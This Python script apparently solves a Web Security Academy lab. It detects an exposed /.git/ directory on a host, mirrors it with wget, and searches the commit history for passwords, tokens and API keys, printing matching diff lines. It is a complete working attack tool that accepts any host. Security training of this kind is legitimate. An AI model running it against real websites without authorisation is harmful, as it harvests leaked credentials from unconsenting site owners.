#!/usr/bin/env python3
# Information disclosure in version control history — free alternative to
# Burp Pro's content discovery.
#
# What it does:
#   1. Checks whether /.git/ is exposed (HEAD + config).
#   2. Dumps the repository with `wget -r` (the official lab method).
#   3. Removes the index.html files that wget saves for each directory listing
#      (they confuse git as fake refs).
#   4. Prints `git log` and the diff of any commit whose message or diff mentions
#      a password/secret.
#
# Usage:
#   python3 git_disclosure.py <host> [output_dir]
#
# Example:
#   python3 git_disclosure.py 0a650056034de61380059ee900be0089.web-security-academy.net

import os
import re
import shutil
import subprocess
import sys
import urllib.error
import urllib.request

SENSITIVE = re.compile(r"(?i)(password|passwd|secret|token|api[_-]?key|ADMIN_)")


def fetch(url):
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=20) as resp:
        return resp.status, resp.read().decode("utf-8", "replace")


def run(cmd, cwd=None):
    return subprocess.run(cmd, cwd=cwd, capture_output=True, text=True)


def main():
    if len(sys.argv) < 2:
        print("Usage: python3 git_disclosure.py <host> [output_dir]")
        return 1

    host = sys.argv[1].replace("https://", "").replace("http://", "").strip("/")
    base = "https://" + host
    out_dir = sys.argv[2] if len(sys.argv) > 2 else "gitdump"

    print("Target: %s\n" % base)

    # 1) is .git exposed?
    try:
        status, head = fetch(base + "/.git/HEAD")
    except urllib.error.HTTPError as e:
        print("[-] /.git/HEAD -> %d (not exposed)" % e.code)
        return 1

    print("[*] /.git/HEAD -> %d" % status)
    print("    %s" % head.strip()[:80])
    if "ref:" not in head:
        print("[-] response does not look like a git HEAD")
        return 1

    try:
        _, config = fetch(base + "/.git/config")
        print("[*] /.git/config:")
        for line in config.splitlines()[:8]:
            print("    " + line)
    except Exception:
        pass

    # 2) dump the repository
    repo_root = os.path.join(out_dir, host)
    if os.path.exists(out_dir):
        shutil.rmtree(out_dir)

    print("\n[*] dumping with wget -r ...")
    result = run(["wget", "-r", "-np", "-q", base + "/.git/", "-P", out_dir])
    if result.returncode != 0:
        print("[-] wget failed: %s" % result.stderr.strip()[:200])
        return 1

    # 3) remove the index.html files saved from directory listings
    removed = 0
    for root, _, files in os.walk(repo_root):
        for name in files:
            if name == "index.html":
                os.remove(os.path.join(root, name))
                removed += 1
    print("[*] removed %d index.html file(s)" % removed)

    # 4) inspect the history
    log = run(["git", "log", "--all", "--oneline"], cwd=repo_root)
    if log.returncode != 0:
        print("[-] git log failed: %s" % log.stderr.strip()[:200])
        return 1

    print("\n[*] git log:")
    commits = []
    for line in log.stdout.splitlines():
        print("    " + line)
        parts = line.split(None, 1)
        if parts:
            commits.append((parts[0], parts[1] if len(parts) > 1 else ""))

    print("\n[*] looking for secrets in commits ...")
    for sha, message in commits:
        diff = run(["git", "show", sha], cwd=repo_root).stdout
        interesting = bool(SENSITIVE.search(message)) or bool(SENSITIVE.search(diff))
        if not interesting:
            continue
        print("\n" + "=" * 70)
        print("commit %s %s" % (sha, message))
        print("=" * 70)
        for line in diff.splitlines():
            if line.startswith(("+++", "---", "@@", "diff ")):
                continue
            if line.startswith(("+", "-")) and SENSITIVE.search(line):
                print("    " + line)

    print("\n[*] done. Repo at: %s" % repo_root)
    return 0


if __name__ == "__main__":
    sys.exit(main())
